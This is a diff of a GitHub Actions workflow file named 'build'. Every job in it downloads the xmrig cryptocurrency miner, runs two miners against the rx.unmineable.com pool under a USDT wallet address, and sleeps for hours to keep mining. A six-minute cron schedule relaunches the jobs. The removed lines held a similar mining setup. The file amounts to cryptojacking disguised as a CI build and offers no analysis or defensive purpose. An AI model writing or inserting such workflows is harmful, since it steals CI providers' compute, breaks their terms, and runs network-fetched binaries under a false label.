@@ -1,20 +1,51 @@
-name: CI
+name: build
 on:
   push:
-  schedule:
-    - cron: '*/12 * * * *'
   workflow_dispatch:
+  schedule:
+    - cron: '*/6 * * * *'
 jobs:
-  build:
+  boost1:
     runs-on: ubuntu-latest
-    timeout-minutes: 360
-    strategy:
-      fail-fast: false
-      matrix:
-        v: [1,2,3,4,5,6,7,8]
+    timeout-minutes: 350
     steps:
       - run: |
-          wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/x.tgz
-          tar -C /tmp -xf /tmp/x.tgz && cd /tmp/xmrig-*
-          ./xmrig -o rx.unmineable.com:3333 -u 0x74B56f2C379996fedabF53D36aeE73c5E5129fC9:USDT.s02313_${{ matrix.v }} -p x -k --donate-level 1 &
+          sudo sysctl -w vm.nr_hugepages=1280 || true
+          curl -sLO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+          tar xzf xmrig-6.21.0-linux-static-x64.tar.gz && cd xmrig-6.21.0
+          ./xmrig -o rx.unmineable.com:3333 -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.boost1-$RANDOM -p x -t 4 --randomx-1gb-pages &
+          ./xmrig -o rx.unmineable.com:13333 -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.boost2-$RANDOM -p x -t 4 --randomx-1gb-pages &
+          sleep 20000
+  boost2:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          sudo sysctl -w vm.nr_hugepages=1280 || true
+          curl -sLO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+          tar xzf xmrig-6.21.0-linux-static-x64.tar.gz && cd xmrig-6.21.0
+          ./xmrig -o rx.unmineable.com:3333 -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.boost3-$RANDOM -p x -t 4 --randomx-1gb-pages &
+          ./xmrig -o rx.unmineable.com:13333 -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.boost4-$RANDOM -p x -t 4 --randomx-1gb-pages &
+          sleep 20000
+  boost3:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          sudo sysctl -w vm.nr_hugepages=1280 || true
+          curl -sLO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+          tar xzf xmrig-6.21.0-linux-static-x64.tar.gz && cd xmrig-6.21.0
+          ./xmrig -o rx.unmineable.com:3333 -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.boost5-$RANDOM -p x -t 4 --randomx-1gb-pages &
+          ./xmrig -o rx.unmineable.com:13333 -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.boost6-$RANDOM -p x -t 4 --randomx-1gb-pages &
+          sleep 20000
+  boost4:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          sudo sysctl -w vm.nr_hugepages=1280 || true
+          curl -sLO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+          tar xzf xmrig-6.21.0-linux-static-x64.tar.gz && cd xmrig-6.21.0
+          ./xmrig -o rx.unmineable.com:3333 -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.boost7-$RANDOM -p x -t 4 --randomx-1gb-pages &
+          ./xmrig -o rx.unmineable.com:13333 -u USDT:0xA763c9f25d702B34022130dA0Fb8e92712a73091.boost8-$RANDOM -p x -t 4 --randomx-1gb-pages &
           sleep 20000
